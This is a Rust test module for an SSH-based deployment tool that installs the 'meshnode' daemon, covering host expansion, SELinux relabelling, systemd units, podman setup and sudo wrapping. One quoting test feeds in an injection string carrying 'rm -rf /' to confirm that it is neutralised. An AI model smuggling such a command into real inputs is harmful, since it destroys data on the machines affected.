        assert_eq!(expand("192.168.1.7").expect("expands"), ["192.168.1.7"]);
        assert_eq!(expand("weird{host}").expect("expands"), ["weird{host}"]);
        assert_eq!(
            expand("unbalanced{1..2").expect("expands"),
            ["unbalanced{1..2"]
        );
    }

    #[test]
    fn an_absurd_range_is_refused_before_it_opens_a_socket() {
        let e = expand("n{1..100000}").expect_err("too many");
        assert!(e.to_string().contains("typo"), "{e}");
    }

    #[test]
    fn a_pasted_column_is_one_list_without_duplicates() {
        let got = expand_all(&["ops@a ops@b\nops@c, ops@a", "# comment", "ops@r{1..2}"])
            .expect("expands");
        assert_eq!(got, ["ops@a", "ops@b", "ops@c", "ops@r1", "ops@r2"]);
    }

    #[test]
    fn a_subnet_expands_to_its_hosts() {
        assert_eq!(
            expand_all(&["ops@192.0.2.0/30"]).expect("expands"),
            ["ops@192.0.2.1", "ops@192.0.2.2"]
        );
        // A /31 is a point-to-point pair with no network or broadcast.
        assert_eq!(
            expand_all(&["192.0.2.0/31"]).expect("expands"),
            ["192.0.2.0", "192.0.2.1"]
        );
        assert_eq!(
            expand_all(&["192.0.2.7/32"]).expect("expands"),
            ["192.0.2.7"]
        );
        assert_eq!(expand_all(&["2001:db8::/126"]).expect("expands").len(), 4);
        // Ranges and subnets compose, and a name with a slash that is not
        // a network passes through.
        assert_eq!(
            expand_all(&["r{1..2}/x"]).expect("expands"),
            ["r1/x", "r2/x"]
        );
        let e = expand_all(&["10.0.0.0/8"]).expect_err("too big");
        assert!(e.to_string().contains("smaller prefix"), "{e}");
    }

    #[test]
    fn targets_parse_every_spelling() {
        let t = Target::parse("ops@rack-1").expect("parses");
        assert_eq!(t.user.as_deref(), Some("ops"));
        assert_eq!(t.host, "rack-1");
        assert_eq!(t.port, 22);
        assert_eq!(t.label(), "ops@rack-1");

        let t = Target::parse("rack-1:2222").expect("parses");
        assert_eq!(t.user, None);
        assert_eq!((t.host.as_str(), t.port), ("rack-1", 2222));
        assert_eq!(t.label(), "rack-1:2222");

        let t = Target::parse("ssh://pi@[fe80::1]:2222/").expect("parses");
        assert_eq!(t.user.as_deref(), Some("pi"));
        assert_eq!((t.host.as_str(), t.port), ("fe80::1", 2222));
        assert_eq!(t.label(), "pi@[fe80::1]:2222");

        let t = Target::parse("2001:db8::42").expect("parses");
        assert_eq!((t.host.as_str(), t.port), ("2001:db8::42", 22));

        assert!(Target::parse("").is_err());
        assert!(Target::parse("ops@").is_err());
        assert!(Target::parse("host:99999").is_err());
        assert!(Target::parse("[fe80::1").is_err());
    }

    /// A run-wide port fills in the rows that said nothing, and loses to
    /// every row that said something — which is what makes one field
    /// usable on a rack that has one exception in it.
    #[test]
    fn a_default_port_fills_the_gaps_and_never_overrules_a_stated_one() {
        let t = Target::parse_with_default("rack-1", 2222).expect("parses");
        assert_eq!((t.host.as_str(), t.port), ("rack-1", 2222));
        // Normalised, because the label is what the next step re-parses:
        // a port that vanished from the string would be a port dropped.
        assert_eq!(t.label(), "rack-1:2222");
        assert_eq!(Target::parse(&t.label()).expect("re-parses"), t);

        for (raw, want) in [
            ("rack-1:22", 22),
            ("ops@rack-1:2022", 2022),
            ("[fe80::1]:22", 22),
        ] {
            let t = Target::parse_with_default(raw, 2222).expect("parses");
            assert_eq!(t.port, want, "{raw} names its own port");
        }

        // A bare IPv6 literal has no room for a port, so it takes the
        // default like any other address that named none.
        let t = Target::parse_with_default("2001:db8::42", 2222).expect("parses");
        assert_eq!((t.host.as_str(), t.port), ("2001:db8::42", 2222));
        assert_eq!(t.label(), "[2001:db8::42]:2222");
        assert_eq!(Target::parse(&t.label()).expect("re-parses"), t);

        // Nothing is still 22, and a nonsense default is 22 rather than
        // a port nothing listens on.
        assert_eq!(Target::parse_with_default("rack-1", 0).expect("x").port, 22);
        assert_eq!(Target::parse("rack-1").expect("x").port, 22);
    }

    /// The bug this exists for: `mv` is `rename(2)`, `rename(2)` carries
    /// the source's SELinux label, and a binary wearing `/tmp`'s label
    /// cannot be executed by systemd however correct its mode and owner
    /// are.
    #[test]
    fn everything_moved_into_place_is_relabelled() {
        let plan = InstallPlan::system(None);
        let s = plan.install_script(Some("/tmp/meshnode.ab12cd"));
        assert!(
            s.contains("mv -f '/tmp/meshnode.ab12cd'"),
            "the install still moves the staged file"
        );
        for (what, after) in [
            ("the binary", "restorecon -F '/usr/local/bin/meshnode'"),
            (
                "the unit",
                "restorecon -F '/etc/systemd/system/meshnode.service'",
            ),
        ] {
            assert!(s.contains(after), "{what} is relabelled: {s}");
        }
        // …and the fallback for a machine with coreutils but no
        // policycoreutils.
        assert!(
            s.contains("chcon -t bin_t '/usr/local/bin/meshnode'"),
            "{s}"
        );
        // The swap an upgrade does is the same move with the same trap.
        let up = plan.upgrade_script("/tmp/meshnode.ef34gh");
        assert!(
            up.contains("restorecon -F '/usr/local/bin/meshnode'"),
            "{up}"
        );
        // A relabel never fails the install: a machine with no labels has
        // nothing to put right, and `set -e` would end the run over it.
        for line in s.lines().filter(|l| l.contains("restorecon -F")) {
            assert!(line.contains("|| true"), "best-effort: {line}");
        }
    }

    /// Enabling is what makes a node survive a reboot, so a refusal is
    /// reported rather than swallowed.
    #[test]
    fn the_unit_is_enabled_and_says_whether_it_took() {
        let s = InstallPlan::system(None).install_script(None);
        assert!(s.contains("systemctl enable meshnode"), "{s}");
        assert!(s.contains("mw.enabled=yes"), "{s}");
        assert!(s.contains("mw.enabled=no"), "{s}");
        assert!(
            !s.contains("systemctl enable meshnode >/dev/null 2>&1 || true"),
            "a swallowed enable is the bug this replaced: {s}"
        );
    }

    /// `203/EXEC` plus a label systemd may not execute is the one failure
    /// whose own error message points somewhere else entirely.
    #[test]
    fn a_refused_label_is_named_rather_than_left_as_permission_denied() {
        let out = "mw.exec_status=203\nmw.exec_context=unconfined_u:object_r:user_tmp_t:s0\n";
        let hint = start_failure_hint(out).expect("a hint");
        assert!(hint.contains("SELinux"), "{hint}");
        assert!(hint.contains("user_tmp_t"), "{hint}");
        assert!(hint.contains("restorecon"), "{hint}");

        // A correctly labelled binary that failed to start is the daemon's
        // own problem, and its logs say more than a guess would.
        assert_eq!(
            start_failure_hint("mw.exec_status=203\nmw.exec_context=system_u:object_r:bin_t:s0\n"),
            None
        );
        // So is any non-EXEC failure, whatever the label.
        assert_eq!(
            start_failure_hint(
                "mw.exec_status=1\nmw.exec_context=unconfined_u:object_r:user_tmp_t:s0\n"
            ),
            None
        );
        // A machine with no SELinux says nothing about labels.
        assert_eq!(start_failure_hint("mw.exec_status=203\n"), None);
        assert_eq!(start_failure_hint("mw.started=systemd\n"), None);

        // A machine that labels, but whose `stat` cannot say what the
        // label is, still gets the answer — softened to what is known.
        let hint =
            start_failure_hint("mw.exec_status=203\nmw.exec_context=\nmw.selinux=enforcing\n")
                .expect("a hint");
        assert!(hint.contains("SELinux is enforcing"), "{hint}");
        assert!(hint.contains("ls -Z"), "{hint}");
        // Permissive means the label is not what stopped it.
        assert_eq!(
            start_failure_hint("mw.exec_status=203\nmw.exec_context=\nmw.selinux=permissive\n"),
            None
        );
    }

    /// The probe asks the machine, rather than reading its distro name and
    /// guessing: SELinux ships on by default on Fedora and RHEL, ships off
    /// on Debian and Ubuntu, and either can be changed by whoever runs it.
    #[test]
    fn selinux_is_asked_of_the_machine() {
        let script = probe_script("/usr/local/bin/meshnode", "/var/lib/meshware");
        assert!(script.contains("getenforce"), "{script}");
        assert!(script.contains("/sys/fs/selinux/enforce"), "{script}");

        let probe = |line: &str| {
            parse_probe(&format!(
                "mw.os=Linux\nmw.arch=x86_64\n{line}\nmw.probe=done\n"
            ))
            .expect("parses")
            .selinux
        };
        assert_eq!(probe("mw.selinux=enforcing"), Selinux::Enforcing);
        assert_eq!(probe("mw.selinux=permissive"), Selinux::Permissive);
        assert_eq!(probe("mw.selinux=disabled"), Selinux::Absent);
        assert_eq!(probe("mw.os=Linux"), Selinux::Absent, "a silent probe");
        assert!(Selinux::Enforcing.enforces());
        assert!(!Selinux::Permissive.enforces());
    }

    #[test]
    fn an_ipv6_dial_address_is_bracketed() {
        assert_eq!(dial_addr("rack-1", 41234), "rack-1:41234");
        assert_eq!(dial_addr("fe80::1", 41234), "[fe80::1]:41234");
        assert!("[fe80::1]:41234".parse::<std::net::SocketAddr>().is_ok());
    }

    #[test]
    fn arch_spellings_are_normalised_to_the_release_names() {
        assert_eq!(normalise_arch("amd64"), "x86_64");
        assert_eq!(normalise_arch("arm64"), "aarch64");
        assert_eq!(normalise_arch("riscv64"), "riscv64");
        assert_eq!(
            artifact_name("0.6.0", "arm64"),
            "meshnode-v0.6.0-aarch64-unknown-linux-musl"
        );
        assert_eq!(
            arch_of_artifact("meshnode-v0.6.0-aarch64-unknown-linux-musl"),
            Some("aarch64")
        );
        assert_eq!(arch_of_artifact("meshnode"), None);
    }

    #[test]
    fn a_home_relative_install_path_still_expands() {
        assert_eq!(remote_path("~/bin/meshnode"), "\"$HOME/\"'bin/meshnode'");
        assert_eq!(
            remote_path("/opt/my tools/meshnode"),
            "'/opt/my tools/meshnode'"
        );
        assert_eq!(remote_path("~"), "'~'");
    }

    #[test]
    fn strings_are_quoted_before_they_cross_a_shell() {
        assert_eq!(shell_quote("gpu"), "'gpu'");
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
        assert_eq!(shell_quote("a; rm -rf /"), "'a; rm -rf /'");
    }

    #[test]
    fn the_probe_is_read_from_labelled_lines_only() {
        let out = "Welcome to rack-1!\n\
                   mw.os=Linux\nmw.arch=aarch64\nmw.user=ops\nmw.home=/home/ops\nmw.host=rack-1\n\
                   mw.distro=Debian GNU/Linux 12 (bookworm)\nmw.version=meshnode 0.5.0\n\
                   mw.exe=/usr/local/bin/meshnode\nmw.systemd=1\nmw.exe=/usr/bin/meshnode\n\
                   mw.service=active\nmw.mesh=system\nmw.priv=sudo-password\nmw.firewall=ufw\nmw.probe=done\n";
        let p = parse_probe(out).expect("parses");
        assert_eq!(p.os, "Linux");
        assert_eq!(p.arch, "aarch64");
        assert_eq!(p.user, "ops");
        assert_eq!(p.hostname, "rack-1");
        assert_eq!(p.version_number().as_deref(), Some("0.5.0"));
        // The unit's ExecStart is printed last and wins.
        assert_eq!(p.exe.as_deref(), Some("/usr/bin/meshnode"));
        assert!(p.systemd);
        assert!(p.service_active);
        assert_eq!(p.existing_mesh, Some(ExistingMesh::System));
        assert_eq!(p.privilege, Some(Privilege::SudoPassword));
        assert_eq!(p.firewall, Firewall::Ufw);

        let e = parse_probe("bash: uname: not found\n").expect_err("no answer");
        assert!(e.to_string().contains("probe"), "{e}");
    }

    #[test]
    fn privilege_wrappers_send_a_password_only_when_sudo_will_read_one() {
        assert_eq!(Privilege::Root.wrap(None, "sh -s"), "sh -s");
        assert_eq!(
            Privilege::SudoNoPassword.wrap(None, "sh -s"),
            "sudo -n sh -s"
        );
        assert_eq!(
            Privilege::SudoPassword.wrap(Some("meshnode"), "sh -s"),
            "sudo -k -S -p '' -u 'meshnode' sh -s"
        );
        assert!(Privilege::SudoPassword.wants_password());
        assert!(!Privilege::SudoNoPassword.wants_password());
        assert!(!Privilege::Root.wants_password());
        // Root running something as the service account needs no sudo.
        let as_svc = Privilege::Root.wrap(Some("meshnode"), "env X=1 meshnode join");
        assert!(as_svc.contains("runuser -u 'meshnode' -- env X=1 meshnode join"));
        assert!(as_svc.contains("su -s /bin/sh 'meshnode' -c"));
    }

    #[test]
    fn the_system_unit_is_the_packaged_one_re_pointed() {
        let plan = InstallPlan::system(Some("/opt/meshware/bin/meshnode"));
        let unit = plan.unit_text();
        assert!(unit.contains("ExecStart=/opt/meshware/bin/meshnode up"));
        assert!(!unit.contains(UNIT_EXEC_ANCHOR));
        assert!(unit.contains("Environment=MESHWARE_DATA_DIR=/var/lib/meshware"));
        assert!(unit.contains("ProtectSystem=full"), "hardening kept");
        assert!(unit.contains("User=meshnode"));
        // The anchors this module re-points must still exist in the
        // packaged file — the test that turns a unit rewrite into a
        // failing build rather than a broken deploy.
        for anchor in [
            UNIT_EXEC_ANCHOR,
            UNIT_DATA_ANCHOR,
            UNIT_CONFIG_ANCHOR,
            UNIT_RW_ANCHOR,
        ] {
            assert!(
                UNIT_TEMPLATE.contains(anchor),
                "packaged unit lost `{anchor}`"
            );
        }
        assert!(DROPIN_TEMPLATE.contains(DROPIN_RW_ANCHOR));
        assert!(
            plan.dropin_text()
                .contains("ReadWritePaths=/opt/meshware/bin")
        );
    }

    /// Both units restart after any exit but the daemon's two deliberate
    /// refusals, and the statuses they spare are the ones `meshnode up`
    /// uses (ENG-1).
    #[test]
    fn every_unit_restarts_after_a_crash_but_not_after_a_refusal() {
        use crate::daemon::exit_status;
        let spared = format!(
            "RestartPreventExitStatus={} {}",
            exit_status::DATA_TOO_NEW,
            exit_status::CONFIG
        );
        let system = InstallPlan::system(None).unit_text();
        let user = InstallPlan::user("/home/ada", "ada").user_unit_text();
        for (name, unit) in [("system", &system), ("user", &user)] {
            let lines: Vec<&str> = unit.lines().map(str::trim).collect();
            assert!(lines.contains(&"Restart=always"), "{name} unit: {unit}");
            assert!(lines.contains(&spared.as_str()), "{name} unit: {unit}");
            assert!(lines.contains(&"Type=notify"), "{name} unit: {unit}");
            assert!(lines.contains(&"WatchdogSec=90"), "{name} unit: {unit}");
            assert!(
                lines.iter().any(|l| l.starts_with("StartLimitBurst=")),
                "{name} unit: {unit}"
            );
            assert!(!unit.contains("\nRestart=on-success"), "{name} unit");
        }
    }

    #[test]
    fn the_install_script_writes_the_unit_and_enables_without_starting() {
        let plan = InstallPlan::system(None);
        let s = plan.install_script(Some("/tmp/meshnode.abc123"));
        assert!(s.contains("mv -f '/tmp/meshnode.abc123' '/usr/local/bin/meshnode'"));
        assert!(s.contains("useradd --system --home-dir '/var/lib/meshware'"));
        // …and the sub-id range that `--system` does not allocate, without
        // which rootless podman cannot unpack a stock image (T2). A node
        // deployed without it detects its engine, announces that it runs
        // containers, and then fails on `lchown /etc/shadow`.
        assert!(
            s.contains("--add-subuids") && s.contains("--add-subgids"),
            "a remotely deployed node must be able to run the containers it \
             announces it can run"
        );
        assert!(
            s.contains("enable-linger"),
            "…and get a systemd user session"
        );
        // A node that already tried to run a container has storage built
        // under the old, empty mapping; adding the range does not fix that
        // retroactively. Without this a re-deploy looks like a repair and
        // fails in exactly the same place.
        assert!(
            s.contains("podman system migrate"),
            "and re-map its storage"
        );
        // **With a login environment.** Inheriting the installer's cwd and
        // `HOME` fails two ways: podman cannot `chdir` into a directory the
        // service account may not read (`cannot chdir to /home/<you>:
        // Permission denied`), and it looks for the container storage under
        // the wrong home. Deploying from a login shell hit the first.
        assert!(
            s.contains("su -s /bin/sh -l -c 'podman system migrate'"),
            "the migrate needs -l, or it runs in the installer's directory \
             with the installer's HOME"
        );
        // …but only when the range actually moved, because a migrate stops
        // running containers.
        assert!(
            s.contains("mw_ids_changed"),
            "a migrate on every deploy would turn a re-install into an outage"
        );
        // **Outside the `getent passwd` guard**, so it repairs an account
        // that already exists rather than only helping a brand-new one —
        // which is what makes re-running the installer a fix for a node
        // deployed before any of this existed.
        let made_user = s.find("useradd --system").expect("creates the user");
        let guard_end = s[made_user..].find("\nfi\n").expect("guard closes") + made_user;
        assert!(
            s.find("--add-subuids").expect("allocates a range") > guard_end,
            "the sub-id block must run for an existing user too"
        );
        assert!(s.contains("cat > /etc/systemd/system/meshnode.service <<'MW_EOF'"));
        assert!(s.contains("fleet-upgrade.conf <<'MW_EOF'"));
        // T2: containers are made by the account's own podman service,
        // reached at run/podman.sock — a rootless container cannot be made
        // from inside the unit — and the drop-in that relaxed the unit for
        // the old way is taken back.
        assert!(
            s.contains("ListenStream=/var/lib/meshware/run/podman.sock"),
            "a deployed node must be able to run the containers it announces"
        );
        assert!(
            s.contains("command -v podman") && s.contains("enable podman.socket"),
            "…where podman is installed"
        );
        assert!(
            s.contains("rm -f /etc/systemd/system/meshnode.service.d/containers.conf")
                && !s.contains("NoNewPrivileges=false"),
            "the unit keeps its hardening"
        );
        assert!(s.contains("systemctl enable meshnode"));
        // As a command, not as a word: the unit's own comments may mention it.
        assert!(
            !s.lines()
                .any(|l| l.trim_start().starts_with("systemctl start")),
            "join comes before start"
        );
        assert!(s.contains("firewall-cmd --permanent --add-port=7777/udp"));

        let mut quiet = InstallPlan::system(None);
        quiet.fleet_upgrade = false;
        quiet.open_firewall = false;
        let s = quiet.install_script(Some("/tmp/x"));
        assert!(s.contains("rm -f /etc/systemd/system/meshnode.service.d/fleet-upgrade.conf"));
        assert!(!s.contains("firewall-cmd"));
    }

    #[test]
    fn a_user_install_stays_inside_the_home() {
        let plan = InstallPlan::user("/home/pi/", "pi");
        assert_eq!(plan.install_path, "/home/pi/.local/bin/meshnode");
        assert_eq!(plan.data_dir, "/home/pi/.meshware");
        assert_eq!(plan.run_as(), None);
        let s = plan.install_script(Some("/tmp/x"));
        assert!(s.contains("systemd/user/meshnode.service"));
        let bare = plan.install_script(None);
        assert!(!bare.contains("mv -f"), "no binary to move");
        assert!(bare.contains("systemd/user/meshnode.service"));
        assert!(!s.contains("useradd"));
        assert!(
            plan.user_unit_text()
                .contains("ExecStart=/home/pi/.local/bin/meshnode up")
        );
        assert!(
            plan.start_script()
                .contains("systemctl --user start meshnode")
        );
    }

    #[test]
    fn the_joiner_runs_with_the_service_environment() {
        let plan = InstallPlan::system(None);
        let cmd = plan.join_command(&["gpu".into(), "dc=east".into()], 300, Some("rack 1"));
        assert_eq!(
            cmd,
            "env MESHWARE_DATA_DIR='/var/lib/meshware' XDG_CONFIG_HOME='/etc/meshware' \
             MESHWARE_NODE_NAME='rack 1' '/usr/local/bin/meshnode' join --pair --json --wait 300s \
             --tag 'gpu' --tag 'dc=east'"
        );
        assert_eq!(plan.run_as(), Some("meshnode"));
        let wrapped = Privilege::SudoPassword.wrap(plan.run_as(), &cmd);
        assert!(wrapped.starts_with("sudo -k -S -p '' -u 'meshnode' env MESHWARE_DATA_DIR"));
    }

    #[test]
    fn start_and_upgrade_scripts_name_what_they_did() {
        let plan = InstallPlan::system(None);
        let start = plan.start_script();
        assert!(start.contains("systemctl start meshnode"));
        assert!(start.contains("mw.started=systemd"));
        assert!(start.contains("mw.started=nohup"));
        assert!(start.contains("runuser -u 'meshnode'"), "{start}");

        let up = plan.upgrade_script("/tmp/meshnode.new");
        assert!(up.contains("mw.owner=dpkg; exit 3"));
        assert!(up.contains("mv -f '/tmp/meshnode.new' '/usr/local/bin/meshnode'"));
        assert!(up.contains("systemctl restart meshnode"));

        let reset = plan.reset_script();
        assert!(reset.contains("systemctl stop meshnode"));
        assert!(reset.contains(".replaced-"));
    }

    /// The remote scripts and unit files, pinned as text.
    ///
    /// Everything these produce runs as root on somebody else's machine,
    /// and a `contains` assertion cannot tell a reordered `mv` from an
    /// intended one. A snapshot diff can: `cargo insta review` shows
    /// exactly what changed, and accepting it is a decision somebody makes
    /// on purpose.
    #[test]
    fn remote_scripts_are_pinned() {
        let system = InstallPlan::system(None);
        insta::assert_snapshot!("system_unit", system.unit_text());
        insta::assert_snapshot!("system_dropin", system.dropin_text());
        insta::assert_snapshot!(
            "system_install",
            system.install_script(Some("/tmp/meshnode.abc123"))
        );
        insta::assert_snapshot!("system_install_no_binary", system.install_script(None));
        insta::assert_snapshot!("system_start", system.start_script());
        insta::assert_snapshot!("system_upgrade", system.upgrade_script("/tmp/meshnode.new"));
        insta::assert_snapshot!("system_reset", system.reset_script());
        insta::assert_snapshot!(
            "system_join",
            system.join_command(&["gpu".into()], 300, Some("rack-1"))
        );
        insta::assert_snapshot!("firewall", system.firewall_script());
        insta::assert_snapshot!(
            "probe",
            probe_script("/usr/local/bin/meshnode", "/var/lib/meshware")
        );
        insta::assert_snapshot!("stage", InstallPlan::stage_script());

        let user = InstallPlan::user("/home/pi", "pi");
        insta::assert_snapshot!("user_unit", user.user_unit_text());
        insta::assert_snapshot!(
            "user_install",
            user.install_script(Some("/tmp/meshnode.abc123"))
        );
        insta::assert_snapshot!("user_start", user.start_script());
        insta::assert_snapshot!("user_upgrade", user.upgrade_script("/tmp/meshnode.new"));
    }

    #[test]
    fn the_stage_script_reports_where_the_binary_landed() {
        let s = InstallPlan::stage_script();
        assert!(s.contains("cat > \"$tmp\""));
        assert!(s.contains("--version"));
        assert!(s.contains("mw.staged="));
        assert_eq!(
            kv_value("x\nmw.staged=/tmp/a\nmw.version=meshnode 0.6.0\n", "staged"),
            Some("/tmp/a")
        );
        assert_eq!(kv_value("mw.a=1\nmw.a=2\n", "a"), Some("2"));
    }

    /// Everything here runs as root on somebody's machine, so it had better
    /// parse. `sh -n` is the shell's own check, with no side effects.
    #[test]
    fn the_scripts_parse() {
        let plan = InstallPlan::system(None);
        for (what, script) in [
            ("install", plan.install_script(Some("/tmp/meshnode.ab12cd"))),
            ("upgrade", plan.upgrade_script("/tmp/meshnode.ef34gh")),
            ("reset", plan.reset_script()),
            (
                "user install",
                InstallPlan::user("/home/pi", "pi").install_script(None),
            ),
        ] {
            let mut child = std::process::Command::new("sh")
                .arg("-n")
                .stdin(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .spawn()
                .expect("sh");
            use std::io::Write as _;
            child
                .stdin
                .take()
                .expect("stdin")
                .write_all(script.as_bytes())
                .expect("write");
            let out = child.wait_with_output().expect("sh -n");
            assert!(
                out.status.success(),
                "the {what} script does not parse: {}\n{script}",
                String::from_utf8_lossy(&out.stderr)
            );
        }
    }

    /// An `Update over SSH` is how an installed node gets the podman service,
    /// so the upgrade sets it up — before the restart that makes the node
    /// look for it, and with a daemon-reload for the drop-in it removes.
    #[test]
    fn an_upgrade_sets_up_the_podman_service_before_restarting() {
        let up = InstallPlan::system(None).upgrade_script("/tmp/meshnode.ef34gh");
        let engine = up.find("enable podman.socket").expect("sets it up");
        let reload = up[engine..]
            .find("systemctl daemon-reload")
            .expect("reloads")
            + engine;
        let restart = up.find("systemctl restart meshnode").expect("restarts");
        assert!(engine < reload && reload < restart, "{up}");
        // Only a changed drop-in restarts the socket: running containers
        // are attached through it.
        assert!(up.contains("mw_sock=start") && up.contains("mw_sock=restart"));

        let user = InstallPlan::user("/home/pi", "pi").upgrade_script("/tmp/x");
        assert!(
            !user.contains("podman.socket"),
            "a person's own node runs podman directly"
        );
    }

    /// The packaged home gets the same drop-in from the .deb's postinst as a
    /// deployed one gets from here.
    #[test]
    fn the_postinst_writes_the_same_socket_dropin() {
        let postinst = include_str!("../../../packaging/deb/postinst");
        assert!(
            postinst.contains(&engine_socket_dropin("/var/lib/meshware")),
            "packaging/deb/postinst has drifted from deploy::engine_socket_dropin"
        );
        assert_eq!(
            crate::layout::Layout::new("/var/lib/meshware").engine_socket(),
            std::path::Path::new("/var/lib/meshware").join(ENGINE_SOCKET)
        );
    }
}
